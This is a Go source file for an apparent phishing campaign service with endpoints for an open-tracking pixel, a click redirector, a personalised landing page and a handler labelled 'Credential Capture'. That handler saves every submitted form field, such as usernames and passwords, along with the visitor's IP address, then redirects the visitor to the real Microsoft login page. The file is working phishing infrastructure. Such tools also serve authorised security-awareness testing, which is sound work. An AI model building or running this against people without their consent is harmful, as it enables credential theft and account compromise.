package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

// 1x1 transparent GIF
var transparentGIF = []byte{
	0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
	0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21,
	0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
	0x01, 0x00, 0x3b,
}

// RegisterEndpoints registers the public tracking endpoints.
func (s *PhishingService) RegisterEndpoints() {
	s.ts.TsEndpointRegisterPublicRaw("GET", "/px/:id", s.HandleTrackingPixel)
	s.ts.TsEndpointRegisterPublicRaw("GET", "/cl/:id", s.HandleClick)
	s.ts.TsEndpointRegisterPublicRaw("GET", "/lp/:id", s.HandleLander)
	s.ts.TsEndpointRegisterPublicRaw("POST", "/sb/:id", s.HandleSubmit)
}

// extractPathID extracts the last segment of the URL path.
// For /px/abc123.png it returns "abc123" (stripping .png extension)
// For /cl/abc123 it returns "abc123"
func extractPathID(r *http.Request) string {
	path := r.URL.Path
	parts := strings.Split(path, "/")
	if len(parts) == 0 {
		return ""
	}
	last := parts[len(parts)-1]
	// Strip .png extension for tracking pixel
	last = strings.TrimSuffix(last, ".png")
	return last
}

func getRemoteIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	return strings.Split(r.RemoteAddr, ":")[0]
}

// ============================================================================
// GET /px/:id — Tracking Pixel
// ============================================================================

func (s *PhishingService) HandleTrackingPixel(w http.ResponseWriter, r *http.Request) {
	trackingID := extractPathID(r)
	if trackingID == "" {
		w.Header().Set("Content-Type", "image/gif")
		w.Write(transparentGIF)
		return
	}

	s.mu.Lock()
	result, campaignID := s.LoadResultByTrackingID(trackingID)
	if result != nil && result.OpenedAt == 0 {
		result.Status = statusMax(result.Status, "opened")
		result.OpenedAt = nowUnix()
		result.UserAgent = r.UserAgent()
		result.RemoteIP = getRemoteIP(r)
		s.UpdateResult(campaignID, result)

		go s.sendEvent("opened", map[string]interface{}{
			"campaign_id": campaignID,
			"result":      result,
		})
	}
	s.mu.Unlock()

	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
	w.Header().Set("Pragma", "no-cache")
	w.Write(transparentGIF)
}

// ============================================================================
// GET /cl/:id — Click Tracker
// ============================================================================

func (s *PhishingService) HandleClick(w http.ResponseWriter, r *http.Request) {
	trackingID := extractPathID(r)
	if trackingID == "" {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	s.mu.Lock()
	result, campaignID := s.LoadResultByTrackingID(trackingID)
	if result != nil && result.ClickedAt == 0 {
		result.Status = statusMax(result.Status, "clicked")
		result.ClickedAt = nowUnix()
		result.UserAgent = r.UserAgent()
		result.RemoteIP = getRemoteIP(r)
		s.UpdateResult(campaignID, result)

		go s.sendEvent("clicked", map[string]interface{}{
			"campaign_id": campaignID,
			"result":      result,
		})
	}
	s.mu.Unlock()

	// Redirect to landing page
	landerURL := fmt.Sprintf("/lp/%s", trackingID)
	http.Redirect(w, r, landerURL, http.StatusFound)
}

// ============================================================================
// GET /lp/:id — Landing Page
// ============================================================================

func (s *PhishingService) HandleLander(w http.ResponseWriter, r *http.Request) {
	trackingID := extractPathID(r)
	if trackingID == "" {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	s.mu.RLock()
	result, campaignID := s.LoadResultByTrackingID(trackingID)
	s.mu.RUnlock()

	if result == nil {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	campaign, err := s.LoadCampaign(campaignID)
	if err != nil {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	landerContent := s.loadLander(campaign.Lander)
	if landerContent == "" {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	submitURL := fmt.Sprintf("/sb/%s", trackingID)
	replacer := strings.NewReplacer(
		"{{.FirstName}}", result.FirstName,
		"{{.LastName}}", result.LastName,
		"{{.Email}}", result.Email,
		"{{.Company}}", findTargetCompany(s, result.CampaignID, result.TargetID),
		"{{.Position}}", findTargetPosition(s, result.CampaignID, result.TargetID),
		"{{.TrackingID}}", trackingID,
		"{{.SubmitURL}}", submitURL,
		"{{.Subject}}", campaign.Subject,
	)
	html := replacer.Replace(landerContent)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
	w.Write([]byte(html))
}

// ============================================================================
// POST /sb/:id — Credential Capture
// ============================================================================

func (s *PhishingService) HandleSubmit(w http.ResponseWriter, r *http.Request) {
	trackingID := extractPathID(r)
	if trackingID == "" {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	r.ParseForm()
	formData := make(map[string]string)
	for key, values := range r.PostForm {
		if len(values) > 0 {
			formData[key] = values[0]
		}
	}

	submitJSON, _ := json.Marshal(formData)

	s.mu.Lock()
	result, campaignID := s.LoadResultByTrackingID(trackingID)
	if result != nil {
		result.Status = "submitted"
		result.SubmitAt = nowUnix()
		result.SubmitData = string(submitJSON)
		result.UserAgent = r.UserAgent()
		result.RemoteIP = getRemoteIP(r)
		s.UpdateResult(campaignID, result)

		go s.sendEvent("submitted", map[string]interface{}{
			"campaign_id": campaignID,
			"result":      result,
		})
	}
	s.mu.Unlock()

	redirectURL := "https://login.microsoftonline.com"
	if campaignID != "" {
		if campaign, err := s.LoadCampaign(campaignID); err == nil && campaign.RedirectURL != "" {
			redirectURL = campaign.RedirectURL
		}
	}

	http.Redirect(w, r, redirectURL, http.StatusFound)
}

// ============================================================================
// Helpers
// ============================================================================

// statusMax returns the "higher" status in the progression chain.
func statusMax(current string, candidate string) string {
	order := map[string]int{
		"sent":      1,
		"opened":    2,
		"clicked":   3,
		"submitted": 4,
	}
	if order[candidate] > order[current] {
		return candidate
	}
	return current
}

func findTargetCompany(s *PhishingService, campaignID string, targetID string) string {
	targets := s.LoadTargets(campaignID)
	for _, t := range targets {
		if t.ID == targetID {
			return t.Company
		}
	}
	return ""
}

func findTargetPosition(s *PhishingService, campaignID string, targetID string) string {
	targets := s.LoadTargets(campaignID)
	for _, t := range targets {
		if t.ID == targetID {
			return t.Position
		}
	}
	return ""
}
